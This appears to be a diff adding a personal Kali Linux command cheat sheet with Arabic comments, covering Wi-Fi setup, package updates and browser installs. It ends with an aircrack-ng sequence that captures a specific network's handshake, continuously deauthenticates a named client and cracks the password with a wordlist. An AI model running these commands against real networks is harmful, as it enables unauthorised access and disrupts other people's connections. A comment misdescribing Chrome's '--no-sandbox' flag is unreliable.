@@ -1,0 +1,81 @@
+sudo iwconfig wlan0 essid "اسم_شبكتك" key s:"كلمة_المرور_الخاصة_بك"
+
+
+sudo dhclient wlan0
+
+
+ifconfig wlan0
+
+ip a
+iwconfig
+ifconfig -a
+sudo ifconfig wlan0 up
+sudo iwlist wlan0 scanning
+sudo iwlist wlan0 scanning essid any
+sudo iwconfig wlan0 mode monitor 
+sudo iwconfig wlan0
+ 
+sudo ip link set wlan0 down
+sudo iw dev wlan0 set type monitor 
+sudo ip link set wlan0 up
+
+nmcli device wifi list
+
+sudo nmcli device wifi connect "اسم_الشبكة" password "كلمة_المرور"
+
+
+sudo apt install lightdm
+sudo dpkg-reconfigure lightdm  اذا اردت التغير من ال GNOME الى ال lightdm 
+
+sudo apt install kali-desktop-gnome
+sudo systemctl start gdm.service    هذا لتشغيل الخدمه و يعمل يطح المطتب
+
+
+
+sudo apt update 
+sudo apt upgrade -y
+sudo apt full-upgrade -y
+suod apt dist-upgrade -y
+sudo apt clean
+
+grep VERSION /etc/os-release  أداه للبحث عن شيء معين في داخل ملف او مجلد و سوف تطبع لك السطر كامل الذي يحتوي على الكلمه VERSINO الذي هي داخل مجلد etc/os-release
+
+sudo apt install tor
+sudo systemctl enable tor
+
+sudo apt install alsa-utils -y
+
+
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+
+dpkg -i google-chrome-stable_current_amd64.deb
+
+sudo apt install chromium
+
+sudo apt install chromium-ublock-origin
+
+google-chrome --no-sandbox  هذا المر ليتشغيل تطبيف في وضع المسؤول اي ال root
+
+sudo apt install ufw  جدار الحمايه
+
+sudo apt --fix-broken install 
+هذا الأمر يستخدم لإصلاح تثبيت الحزم المعطلة في نظام Linux 
+
+
+sudo dpkg --configure -a   يكمل عمليه ال تثبيت اذا تم ايقافها
+
+
+
+
+
+
+
+sudo airmon-ng wlan0
+
+sudo airodump-ng wlan0
+
+sudo airodump-ng -d BC:E0:01:0C:BF:FF -c 5 -w UsnNewJerseyInt wlan0
+
+sudo aireplay-ng -0 0 -a BC:E0:01:0C:BF:FF -c B2:F0:DE:51:94:22 wlan0 
+
+sudo aircrack-ng newjerseyint -w /home/kali/Desktop/ng/pass.txt
